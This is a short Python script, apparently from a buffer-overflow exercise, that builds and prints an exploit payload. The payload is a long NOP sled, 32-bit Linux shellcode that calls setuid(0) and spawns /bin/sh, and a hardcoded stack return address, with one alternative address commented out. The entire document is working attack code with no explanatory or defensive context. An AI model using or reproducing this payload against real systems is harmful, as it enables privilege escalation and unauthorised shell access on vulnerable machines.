noop_pad = '\x90' * 983
shellcode = '1\xdb\x8dC\x17\x99\xcd\x80\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
#noop_pad2 = '\xf0\x8a\xff\xbf'
noop_pad2 = '\xf0\x8d\xff\xbf'
exploit = noop_pad + shellcode + noop_pad2
print(exploit)
